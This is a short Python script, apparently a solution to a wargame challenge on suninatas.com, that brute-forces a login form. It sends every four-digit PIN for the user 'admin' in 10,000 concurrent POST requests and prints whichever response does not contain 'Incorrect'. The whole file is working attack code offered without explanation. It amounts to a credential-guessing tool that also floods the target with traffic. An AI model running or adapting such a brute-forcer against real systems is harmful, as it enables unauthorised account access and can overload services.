from concurrent.futures import ThreadPoolExecutor
import random
import requests
def post_url(args):
    return requests.post(args[0],data=args[1])



list_of_urls=[tuple(("http://suninatas.com/challenge/web08/web08.asp",{'id': 'admin', 'pw': i})) for i in range(0, 10000)]


with ThreadPoolExecutor(max_workers=10000) as pool:
    response_list = list(pool.map(post_url,list_of_urls))


for response in response_list:
    text = response.text
    if text.find("Incorrect")==-1:
        print(text)
    
